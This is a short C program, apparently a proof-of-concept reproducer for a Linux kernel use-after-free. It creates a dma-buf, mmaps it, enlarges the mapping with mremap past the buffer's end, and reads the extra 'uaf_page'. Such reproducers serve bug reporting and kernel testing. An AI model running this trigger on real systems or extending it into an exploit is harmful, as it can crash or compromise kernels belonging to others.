#define _GNU_SOURCE
#include "dma_buf_t.h"
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/io.h>

#define PAGE_SIZE (4096)
#define DMA_BUF_SIZE (8*PAGE_SIZE)

#define fatal_perror(text) do{perror("[-] " text); exit(-1);}while(0)

int main(int argc, char* argv[])
{
    dma_buf_t *dma_buf = dma_buf_create(DMA_BUF_SIZE);
    if(!dma_buf)
        fatal_perror("dma_buf_create");
    char* mapping = mmap(0, dma_buf->size, PROT_READ|PROT_WRITE, MAP_SHARED, dma_buf->fd, 0);
    if(mapping == MAP_FAILED)
        fatal_perror("dma_buf mmap");
    
    char* new_mapping = mremap(mapping, dma_buf->size, dma_buf->size+2*PAGE_SIZE, MREMAP_MAYMOVE);
    if(new_mapping == MAP_FAILED)
        fatal_perror("dma_buf mremap");
    
    char* uaf_page = new_mapping+dma_buf->size;

    char dummy = *uaf_page;
}